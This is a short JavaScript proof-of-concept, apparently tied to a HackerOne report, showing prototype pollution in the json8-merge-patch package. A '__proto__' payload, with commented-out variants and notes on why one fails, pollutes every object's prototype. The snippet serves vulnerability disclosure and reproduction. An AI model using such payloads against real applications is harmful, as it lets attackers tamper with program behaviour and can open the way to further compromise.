// //https://hackerone.com/reports/980649
// test("prototype pollution in json8-merge-patch", () => {
console.log({}.polluted);

  const json8mergepatch = require("json8-merge-patch");
  json8mergepatch.apply(
    {},
    //JSON.parse('{"constructor": {"prototype": { "polluted": "yes" }}}') //wont work, i checked, because there is an if condition which evaluates to doc['constructor'] != object which ends up reassigning {} to doc 
    //JSON.parse('{ "constructor.prototype": { "polluted": "yes" }}')
    JSON.parse('{ "__proto__": { "polluted": "yes" }}')
  );

console.log({}.polluted);
// });
